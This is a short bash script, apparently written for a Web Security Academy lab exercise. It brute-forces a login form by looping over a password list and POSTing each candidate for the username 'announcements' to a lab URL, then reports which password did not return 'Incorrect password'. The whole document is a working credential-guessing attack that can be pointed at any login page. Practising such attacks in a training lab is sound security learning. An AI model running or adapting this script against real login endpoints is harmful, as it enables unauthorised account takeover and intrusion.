#!/bin/bash


for i in $(cat pass.txt)
do
	rep=$(curl -s -i -X POST 'https://0a8900df03b36487804a857200620098.web-security-academy.net/login' --data "username=announcements&password=$i")
	
	if echo "$rep" | grep -q 'Incorrect password'; then
		echo $i "bad password"
	else
		echo $i "we found it"
	fi
done


